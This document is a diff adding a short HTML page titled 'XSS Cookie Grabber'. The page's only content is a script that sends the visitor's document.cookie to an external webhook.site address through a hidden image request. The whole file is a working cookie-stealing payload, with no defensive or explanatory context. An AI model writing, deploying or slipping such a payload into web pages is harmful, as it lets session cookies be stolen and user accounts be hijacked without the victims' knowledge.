@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS Cookie Grabber</title></head>
+<body>
+<script>
+      new Image().src = 'https://webhook.site/c59f354b-ad67-4e7d-9825-702680f4bbdb?cookie=' + encodeURIComponent(document.cookie);
+</script>
+</body>
+</html>
